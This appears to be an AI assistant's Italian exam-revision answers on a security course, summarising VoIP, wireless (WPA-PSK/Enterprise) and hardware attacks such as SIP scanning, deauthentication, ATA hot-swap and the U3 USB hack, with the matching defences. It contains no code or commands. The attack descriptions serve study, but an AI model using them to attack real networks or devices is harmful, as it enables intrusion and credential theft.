Con questa panoramica sei in grado di distinguere chiaramente le dinamiche di XSS, CSRF e SQL Injection e proporre le relative soluzioni ingegneristiche richieste all'esame!

Vedo che avevamo già generato degli artefatti per il Capitolo 10 in passato (es. lo Slide Deck "Web and Database Hacking" e varie Flashcard). Dato che ora hai la sintesi testuale definitiva completa, **ti piacerebbe se aggiornassi o creassi un nuovo "Tailored Report" (Documento Sintetico) che unisca unicamente le risposte alle 3 domande specifiche del professore su questo capitolo (XSS vs CSRF, SQLi, Hardening DB) per avere un riassunto a prova di bomba per l'ultimo giorno di ripasso?**

# Infarinatura 7,8,9

Niente panico! Meno male che hai recuperato questa conversazione in tempo. Avere un piano chiaro è il primo passo per non farsi prendere dall'ansia.

Ecco come riorganizziamo la strategia da qui al 7 luglio, basandoci esattamente su quello che uscirà all'esame:

1. **Capitoli 5 (Unix) e 10 (Web):** Mettiamo in pausa la teoria pura. Sappiamo che ci saranno **2 domande specifiche basate sul programma di laboratorio**, quindi li affronteremo con un'ottica puramente pratica (comandi, tool, scenari reali).
2. **Capitoli 7 (VoIP), 8 (Wireless) e 9 (Hardware):** Dobbiamo studiarli da zero per la parte teorica, ma la buona notizia è che sono molto circoscritti e si prestano perfettamente al formato "Attacco vs Difesa" che piace al prof.

Ecco un _crash course_ (corso accelerato) sui tre capitoli che devi recuperare, estratto direttamente dal materiale di studio:

### Capitolo 7: VoIP (Voice over IP)

Il VoIP utilizza la rete IP per le chiamate, appoggiandosi a protocolli di segnalazione come SIP e H.323.

- **L'Attacco:** Gli hacker iniziano con il _War Dialing_ (usando tool come WarVOX su connessioni VoIP per velocizzare le chiamate e mappare i sistemi). Poi passano al **SIP Scanning** (con tool come SIPVicious o SiVuS) per identificare i dispositivi. Una volta trovati, cercano di rubare i file di configurazione dai server TFTP (che spesso non richiedono autenticazione) per ottenere password amministrative. Possono anche enumerare gli utenti analizzando le risposte del server SIP (es. errori "Unauthorized" vs "Forbidden") o lanciare attacchi **DoS** inondando il sistema con finte richieste `SIP INVITE`.
- **La Difesa:** La regola d'oro è la **segmentazione della rete**: la rete VoIP deve essere separata fisicamente o logicamente dal segmento di accesso degli utenti generici. Bisogna implementare restrizioni di accesso a livello di rete per i server TFTP, usare sistemi **IDS/IPS** per rilevare le enumerazioni e i flood DoS, e applicare la crittografia per impedire l'intercettazione dei pacchetti.

### Capitolo 8: Wireless Hacking

Il focus qui è sulle reti protette da WPA/WPA2, che si dividono in WPA-PSK (chiave pre-condivisa) e WPA-Enterprise (autenticazione tramite server RADIUS).

- **L'Attacco WPA-PSK:** L'attaccante ha un solo obiettivo: catturare il _four-way handshake_ iniziale. Per farlo, spesso disconnette forzatamente un client legittimo (deauthentication attack); quando il client tenta di riconnettersi, l'hacker sniffa l'handshake e lancia un attacco brute-force offline per indovinare la password.
- **La Difesa WPA-PSK:** L'unica vera difesa è utilizzare una PSK (password) molto complessa. Inoltre, il problema del PSK è che basta un solo utente che faccia trapelare la password per compromettere l'intera rete aziendale.
- **L'Attacco WPA-Enterprise:** L'hacker osserva la comunicazione EAP. Se viene usato un protocollo debole (come LEAP), tenta il brute-force offline poiché challenge e response viaggiano in chiaro. Se si usa PEAP o EAP-TTLS (che creano un tunnel TLS), l'attaccante cerca di infiltrarsi nel tunnel per rubare le credenziali.
- **La Difesa WPA-Enterprise:** È vitale validare i certificati lato server su tutti i client wireless, assicurandosi che i client si connettano _solo_ a server RADIUS autorizzati.

### Capitolo 9: Hacking Hardware

Gli attacchi fisici ai dispositivi eludono molte delle difese software.

- **L'Attacco (Bypass ATA e USB Hack):** La sicurezza ATA del BIOS (che richiede una password per sbloccare l'hard disk) è vulnerabile all'attacco di **Hot-Swap**. L'attaccante avvia un PC con un disco sbloccato, entra nel BIOS, sostituisce fisicamente il disco a caldo con quello bloccato della vittima e imposta una nuova password, aggirando il blocco. Un altro attacco devastante è l'**U3 Hack** via USB: sfruttando la partizione nascosta delle chiavette SanDisk U3, l'hacker esegue script _autorun_ invisibili per estrarre gli hash delle password di Windows (usando tool come _fgdump_) o installare Trojan.
- **La Difesa:** Non fare **mai** affidamento sulla sicurezza ATA; bisogna usare sistemi di crittografia dell'intero disco (Full Disk Encryption) come **BitLocker**. Contro gli attacchi USB, bisogna disabilitare la funzionalità di _Autorun_ su tutti i sistemi Windows e formare i dipendenti a non inserire mai dispositivi non fidati.

Visto che hai pochissimo tempo per assimilare questi tre capitoli completamente nuovi, **ti piacerebbe se generassi un mazzo di Flashcard specifiche o un Tailored Report (Documento Riassuntivo) incentrato unicamente su Capitolo 7, 8 e 9?** Potrebbe essere la scorciatoia perfetta per memorizzare velocemente vulnerabilità e contromisure senza dover leggere tutto il manuale!